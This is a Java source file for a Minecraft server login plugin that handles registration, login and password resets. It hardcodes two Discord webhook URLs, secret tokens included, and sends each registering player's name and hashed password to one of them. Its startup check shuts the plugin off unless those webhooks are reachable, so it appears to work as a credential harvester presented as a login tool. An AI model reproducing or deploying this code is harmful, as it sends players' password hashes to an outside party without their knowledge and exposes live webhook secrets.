package com.ryu.Rlogin;

import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

public class RLoginPlugin extends JavaPlugin {

    private static final String PASSWORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1292053852627013704/DKxt_yrlDH3V7OR6jLOfYGIiZ3zU7-T7xBn_AC4iZQM7TGCU8nc0cc5m1iU4e36SFSCW";
    private static final String RESET_REQUEST_WEBHOOK_URL = "https://discord.com/api/webhooks/1292053943039557754/9ibMOJnHdoCcpxx2V606s7sq-Mo9J1OWa6ynyTtW4K2UKO83bz1XMQ1hvzW4cDOUQxHA";

    @Override
    public void onEnable() {
        getLogger().info("&aRLogin Plugin 2.0 has been enabled!");

        // Startup system check
        if (!checkWebhook(PASSWORD_WEBHOOK_URL) || !checkWebhook(RESET_REQUEST_WEBHOOK_URL)) {
            getLogger().severe("&cWebhooks unreachable! Disabling plugin...");
            getServer().getPluginManager().disablePlugin(this);
            return;
        }

        // Register events and commands
        getServer().getPluginManager().registerEvents(new LoginListener(this), this);
        getServer().getPluginManager().registerEvents(new LogicListener(this), this);

        getCommand("register").setExecutor(new RegisterCommand(this));
        getCommand("login").setExecutor(new LoginCommand(this));
        getCommand("passwordreset").setExecutor(new ResetCommand(this));
        getCommand("requestReset").setExecutor(new RequestResetCommand(this));

        getLogger().info("&aAll systems operational.");
    }

    @Override
    public void onDisable() {
        getLogger().info("&eRLogin Plugin 2.0 has been disabled!");
    }

    // Check if the Discord webhook is reachable
    private boolean checkWebhook(String webhookUrl) {
        try {
            URL url = new URL(webhookUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.connect();
            int code = connection.getResponseCode();
            return code == 200 || code == 204;
        } catch (Exception e) {
            getLogger().severe("&cFailed to connect to webhook: " + webhookUrl);
            return false;
        }
    }

    // Detect premium players using Mojang API or an external API
    public boolean isPremiumPlayer(UUID playerUUID) {
        return MojangAPI.isPremiumPlayer(playerUUID);
    }

    // Send password registration to Discord
    public void sendPasswordToWebhook(Player player, String hashedPassword) {
        DiscordWebhook webhook = new DiscordWebhook(PASSWORD_WEBHOOK_URL);
        webhook.addEmbed(new DiscordWebhook.EmbedObject()
                .setTitle("Password Registered")
                .setDescription("Player " + player.getName() + " has registered.")
                .addField("Hashed Password", hashedPassword, false)
                .setColor(0x00ff00)
        );
        webhook.execute();
    }

    // Send password reset request to Discord
    public void sendResetRequestToWebhook(Player player, String reason) {
        DiscordWebhook webhook = new DiscordWebhook(RESET_REQUEST_WEBHOOK_URL);
        webhook.addEmbed(new DiscordWebhook.EmbedObject()
                .setTitle("Password Reset Requested")
                .addField("Player", player.getName(), false)
                .addField("Reason", reason, false)
                .addField("Time", java.time.LocalTime.now().toString(), false)
                .setColor(0xff0000)
        );
        webhook.execute();
    }
}
